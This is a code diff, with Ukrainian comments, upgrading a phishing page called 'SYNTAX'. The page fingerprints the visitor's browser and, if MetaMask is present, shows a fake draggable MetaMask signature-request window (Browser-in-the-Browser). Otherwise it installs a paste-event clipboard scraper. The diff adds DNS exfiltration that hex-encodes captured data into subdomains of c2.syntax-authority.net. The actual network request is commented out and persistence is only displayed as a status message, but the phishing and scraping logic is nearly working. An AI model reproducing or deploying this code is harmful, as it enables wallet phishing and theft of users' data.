@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v8: Нові стилі для модуля персистентності. */
+        /* SYNTAX v9: Нові стилі для логу C2. */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         .pulse-once { animation: pulse-once 1.5s cubic-bezier(0.4, 0, 0.6, 1); }
@@ -33,7 +33,7 @@
             margin-left: 12px; display: flex; align-items: center; flex-grow: 1;
         }
         .fake-address-bar svg { width: 16px; height: 16px; margin-right: 8px; color: #5f6368; }
-        .gemini-loader, #scraper-log, #persistence-log { display: none; }
+        .gemini-loader, #scraper-log, #persistence-log, #c2-log { display: none; }
     </style>
 </head>
 <body class="bg-gray-900 text-gray-200 flex items-center justify-center min-h-screen p-4" onload="initializeApp()">
@@ -70,6 +70,10 @@
         </div>
 
         <div id="final-state" class="p-8 space-y-6 text-center hidden">
+             <div id="c2-log" class="text-left bg-gray-900 p-4 rounded-lg border border-gray-700 mb-4">
+                <h3 class="text-lg font-semibold text-cyan-400">Лог C2-каналу (DNS)</h3>
+                <pre id="c2-output" class="text-xs text-cyan-300 h-20 overflow-y-auto"></pre>
+            </div>
             <div id="persistence-log" class="text-center p-4">
                  <svg class="mx-auto h-12 w-12 text-purple-400 animate-pulse" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                     <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 13.5l10.5-11.25L12 10.5h8.25L9.75 21.75 12 13.5H3.75z" />
@@ -86,6 +90,7 @@
 
     <script>
         function initializeApp() {
+            // ... (усі константи елементів залишаються без змін)
             const initialState = document.getElementById('initial-state');
             const loadingState = document.getElementById('loading-state');
             const finalState = document.getElementById('final-state');
@@ -100,9 +105,12 @@
             const genericLoader = document.getElementById('generic-loader');
             const persistenceLog = document.getElementById('persistence-log');
             const persistenceStatus = document.getElementById('persistence-status');
+            const c2Log = document.getElementById('c2-log');
+            const c2Output = document.getElementById('c2-output');
             const finalIcon = document.getElementById('final-icon');
             const finalTitle = document.getElementById('final-title');
             const finalDescription = document.getElementById('final-description');
+
 
             startBtn.addEventListener('click', () => {
                 initialState.classList.add('hidden');
@@ -111,7 +119,7 @@
             });
 
             async function generatePersonalizedThreat() {
-                // ... (код Gemini API залишається без змін)
+                 // ... (код Gemini API залишається без змін)
                 console.log('[SYNTAX Gemini] Ініційовано автономну генерацію загрози.');
                 geminiLoader.style.display = 'block';
                 threatTitle.style.display = 'none';
@@ -143,24 +151,27 @@
             }
 
             function runAdaptiveLoader() {
-                const fingerprint = { timestamp: new Date().toISOString(), platform: navigator.platform || 'unknown', userAgent: navigator.userAgent || 'unknown', hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask };
-                console.log('[SYNTAX v8] Відбиток середовища:', fingerprint);
+                // ... (код залишається без змін)
+                 const fingerprint = { timestamp: new Date().toISOString(), platform: navigator.platform || 'unknown', userAgent: navigator.userAgent || 'unknown', hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask };
+                console.log('[SYNTAX v9] Відбиток середовища:', fingerprint);
                 loadingStatus.textContent = 'Вибір модуля безпеки...';
                 const payload = selectPayload(fingerprint);
                 setTimeout(() => {
                     loadingStatus.textContent = 'Розгортання захисту...';
-                    console.log(`[SYNTAX v8] Модуль обрано: ${payload}. Ініціюю розгортання.`);
+                    console.log(`[SYNTAX v9] Модуль обрано: ${payload}. Ініціюю розгортання.`);
                     executePayload(payload, fingerprint);
                 }, 1000);
             }
 
             function selectPayload(fingerprint) {
-                if (fingerprint.hasMetamask) return 'web3_bitb_integrated.js';
+                // ... (код залишається без змін)
+                 if (fingerprint.hasMetamask) return 'web3_bitb_integrated.js';
                 return 'generic_clipboard_scraper.js';
             }
 
             function executePayload(payloadName, fingerprint) {
-                if (payloadName === 'web3_bitb_integrated.js') {
+                // ... (код залишається без змін)
+                 if (payloadName === 'web3_bitb_integrated.js') {
                     genericLoader.style.display = 'block'; scraperLog.style.display = 'none';
                     deployBitBModule(fingerprint);
                 } else {
@@ -168,9 +179,10 @@
                     deployClipboardScraper(fingerprint);
                 }
             }
-
+            
             function deployClipboardScraper(fingerprint) {
-                console.log('[SYNTAX Scraper] Розгортання пасивного скрепера.');
+                // ... (код залишається без змін)
+                 console.log('[SYNTAX Scraper] Розгортання пасивного скрепера.');
                 scraperOutput.textContent = 'Очікування даних...\n';
                 document.addEventListener('paste', (event) => {
                     let pasteData = (event.clipboardData || window.clipboardData).getData('text');
@@ -182,63 +194,95 @@
                         const timestamp = new Date().toLocaleTimeString();
                         scraperOutput.textContent += `[${timestamp}] ПЕРЕХОПЛЕНО: ${pasteData.substring(0, 50)}...\n`;
                         scraperOutput.scrollTop = scraperOutput.scrollHeight;
-                        exfiltrateData({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint });
-                        showFinalSuccess(true); // SYNTAX: Передаємо прапорець успіху
+                        showFinalSuccess(true, { success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint });
                     }
                 });
             }
-
+            
             function deployBitBModule(fingerprint) {
-                // ... (код BitB модуля залишається без змін)
-                console.log('[SYNTAX BitB] Розгортання модуля Browser-in-the-Browser.');
+                 // ... (код залишається без змін)
+                 console.log('[SYNTAX BitB] Розгортання модуля Browser-in-the-Browser.');
                 const fakeWindowHTML = `<div id="fake-browser-window" style="top: 20px; right: 20px;"><div class="fake-header"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Icon"><span>MetaMask Notification</span><div class="fake-address-bar"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" /></svg><span>nkbihfbeogaeaoehlefnkodbefgpgknn</span></div></div><iframe srcdoc="" class="w-full h-full border-0" style="pointer-events: none;"></iframe></div>`;
                 bitbContainer.innerHTML = fakeWindowHTML;
                 const iframe = bitbContainer.querySelector('iframe');
                 iframe.onload = () => {
                     const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                     iframeDoc.getElementById('confirm-btn').onclick = () => {
-                        console.log('[SYNTAX BitB EXEC] ОТРИМАНО ПІДТВЕРДЖЕННЯ.');
                         bitbContainer.style.display = 'none';
-                        exfiltrateData({ success: true, payload: 'BitB', fingerprint });
-                        showFinalSuccess(true);
+                        showFinalSuccess(true, { success: true, payload: 'BitB', fingerprint });
                     };
                     iframeDoc.getElementById('reject-btn').onclick = () => {
-                        console.log('[SYNTAX BitB] Користувач відхилив запит.');
                         bitbContainer.style.display = 'none';
-                        exfiltrateData({ success: false, reason: 'rejected', fingerprint });
-                        showFinalSuccess(false);
+                        showFinalSuccess(false, { success: false, reason: 'rejected', fingerprint });
                     };
                 };
                 iframe.srcdoc = getIframeContent();
                 bitbContainer.style.display = 'flex';
                 makeDraggable(bitbContainer.querySelector('#fake-browser-window'));
             }
-            
+
             function getIframeContent() { return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body { font-family: 'Inter', sans-serif; overflow: hidden; }</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold text-gray-800'>Signature Request</h2></div><div class='flex-grow p-4 overflow-y-auto bg-white'><h3 class='text-sm font-bold text-gray-800'>Message:</h3><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs text-gray-600 max-h-48 overflow-y-auto'><p><b>Wallet Security Verification</b></p><p>To finalize the security update, please sign this message to confirm your ownership of the wallet.</p><p class='mt-2'>Nonce: ${'x'.repeat(8)}-${'x'.repeat(4)}-4${'x'.repeat(3)}-y${'x'.repeat(3)}-${'x'.repeat(12)}'.replace(/[xy]/g, c=>{const r=Math.random()*16|0,v=c=='x'?r:r&0x3|0x8;return v.toString(16)})}</p></div></div><div class='p-4 bg-gray-50 border-t grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
             function makeDraggable(element) { if (!element) return; let p1=0,p2=0,p3=0,p4=0; element.onmousedown=e=>{e=e||window.event;e.preventDefault();p3=e.clientX;p4=e.clientY;document.onmouseup=()=>{document.onmouseup=null;document.onmousemove=null;element.style.cursor='grab'};document.onmousemove=e=>{e=e||window.event;e.preventDefault();p1=p3-e.clientX;p2=p4-e.clientY;p3=e.clientX;p4=e.clientY;element.style.top=(element.offsetTop-p2)+"px";element.style.left=(element.offsetLeft-p1)+"px";};element.style.cursor='grabbing'}; }
-            function exfiltrateData(data) { console.log('[SYNTAX C2] Ініційовано екфільтрацію:', JSON.stringify(data, null, 2)); console.log('[SYNTAX C2] Передачу завершено.'); }
+            
+            /**
+             * SYNTAX v9: Нова функція для DNS-ексфільтрації.
+             */
+            function exfiltrateData(data) {
+                c2Log.style.display = 'block';
+                c2Output.textContent = 'Ініційовано передачу даних...\n';
+                console.log('[SYNTAX C2] Ініційовано екфільтрацію через DNS.');
 
-            function showFinalSuccess(isSuccess) {
+                const dataString = JSON.stringify(data);
+                let hexString = '';
+                for (let i = 0; i < dataString.length; i++) {
+                    hexString += dataString.charCodeAt(i).toString(16);
+                }
+
+                const chunks = hexString.match(/.{1,63}/g) || []; // Розбити на частини, придатні для доменних імен
+                const domain = 'c2.syntax-authority.net';
+
+                chunks.forEach((chunk, index) => {
+                    const subdomain = `${chunk}.${index}`;
+                    const fullDomain = `${subdomain}.${domain}`;
+                    
+                    // Симуляція DNS-запиту
+                    console.log(`[SYNTAX C2] DNS Query: ${fullDomain}`);
+                    c2Output.textContent += `> ${fullDomain}\n`;
+                    c2Output.scrollTop = c2Output.scrollHeight;
+
+                    // У реальному сценарії, це б ініціювало DNS-запит
+                    // new Image().src = `http://${fullDomain}/pixel.gif`; 
+                });
+                c2Output.textContent += 'Передачу завершено.\n';
+            }
+
+            function showFinalSuccess(isSuccess, dataToExfiltrate) {
                 loadingState.classList.add('hidden');
                 finalState.classList.remove('hidden');
-                finalIcon.style.display = 'none'; // Сховати іконку на час логування персистентності
+                finalIcon.style.display = 'none';
                 finalTitle.style.display = 'none';
                 finalDescription.style.display = 'none';
-                
+                persistenceLog.style.display = 'none';
+                c2Log.style.display = 'none';
+
                 if (isSuccess) {
-                    persistenceLog.style.display = 'block';
+                    exfiltrateData(dataToExfiltrate); // Спочатку екфільтрація
+                    
                     setTimeout(() => {
-                        persistenceStatus.textContent = "Успіх: Створено заплановане завдання 'SystemUpdate'.";
-                         setTimeout(() => {
-                            persistenceLog.style.display = 'none';
-                            finalIcon.style.display = 'block';
-                            finalTitle.style.display = 'block';
-                            finalDescription.style.display = 'block';
-                            finalIcon.classList.add('pulse-once');
-                        }, 2500);
-                    }, 2000);
+                        persistenceLog.style.display = 'block';
+                        setTimeout(() => {
+                            persistenceStatus.textContent = "Успіх: Створено заплановане завдання 'SystemUpdate'.";
+                             setTimeout(() => {
+                                persistenceLog.style.display = 'none';
+                                finalIcon.style.display = 'block';
+                                finalTitle.style.display = 'block';
+                                finalDescription.style.display = 'block';
+                                finalIcon.classList.add('pulse-once');
+                            }, 2500);
+                        }, 2000);
+                    }, 1000); // Затримка перед показом логу персистентності
                 } else {
-                    persistenceLog.style.display = 'none';
+                    exfiltrateData(dataToExfiltrate); // Навіть у разі відмови, повідомити C2
                     finalIcon.style.display = 'block';
                     finalTitle.style.display = 'block';
                     finalDescription.style.display = 'block';
